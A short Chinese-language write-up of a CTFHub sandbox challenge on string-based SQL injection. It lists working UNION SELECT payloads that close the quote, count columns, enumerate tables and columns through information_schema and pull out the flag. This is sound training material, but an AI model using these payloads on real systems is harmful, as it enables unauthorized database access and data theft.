# CTFHUB_字符型注入

## 题目内容

![image-20210822202354594](/home/adian/note/Study_Note/网络安全/CTF/pic/15.png)

## WriteUp
和整数型相似，只需要闭合单引号或双引号，注释后面的语句

首先使用单引号使其报错

```
http://challenge-91a8cfbee86c0272.sandbox.ctfhub.com:10800/?id=1'
```

报错，并能通过给出的sql语句判断存在sql注入漏洞

下一步我们查询字段数量

```
1' order by 2 --+
```

在order by 3的时候，报错，证明有两个字段，然后我们查询当前数据库

```
1' union select 1,database() --+
```

结果还是显示ctfhub，这个时候我们需要给参数1前面加上`-`使其报错

```
-1' union select 1,database() --+
```

得到数据库名sqli

```
select * from news where id='-1' union select 1,database() -- '
ID: 1
Data: sqli
```

然后我们使用information_schema来获取sqli数据库下的表名

```
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' --+
```

得到表名为news和flag

```
select * from news where id='-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli' --+
ID: 1
Data: news,flag
```

我们猜解flag表的字段

```
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' --+
```

得到如下结果

```
select * from news where id='-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag' --+
ID: 1
Data: flag
```

得到信息，在flag表下有flag字段，我们查询他

```
-1' union select 1,flag from flag --+
```

得到结果

```
select * from news where id='-1' union select 1,flag from flag -- '
ID: 1
Data: ctfhub{6d76653cb113fa6bbaa5683a}
```

